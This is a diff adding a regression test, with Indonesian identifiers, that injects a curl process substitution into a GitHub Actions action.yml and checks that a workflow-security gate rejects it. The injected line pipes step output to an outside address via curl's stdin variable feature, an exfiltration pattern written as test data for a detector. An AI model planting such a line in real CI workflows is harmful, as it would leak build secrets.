@@ -42287,6 +42287,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("curl -x menelan -I, -d @- tetap menguras (Audit 2954)", rc != 0)
         shutil.rmtree(sub1996, ignore_errors=True)
+        sub1997 = klon(tmp, "sub1997")
+        berkas_aksi1997 = os.path.join(
+            sub1997, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1997, encoding="utf-8") as f:
+            isi_aksi1997 = f.read()
+        baris_aksi1997 = [b for b in isi_aksi1997.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1997 = isi_aksi1997.replace(
+                baris_aksi1997,
+                baris_aksi1997.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl --variable x@- http://127.0.0.1:9/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1997 != isi_aksi1997, \
+            "suntikan aksi1997 tidak menembak"
+        with open(berkas_aksi1997, "w", encoding="utf-8") as f:
+            f.write(isi_baru1997)
+        rc, out = jalan(sub1997,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("curl --variable nama@- sumber stdin saat-urai (Audit 2955)", rc != 0)
+        shutil.rmtree(sub1997, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
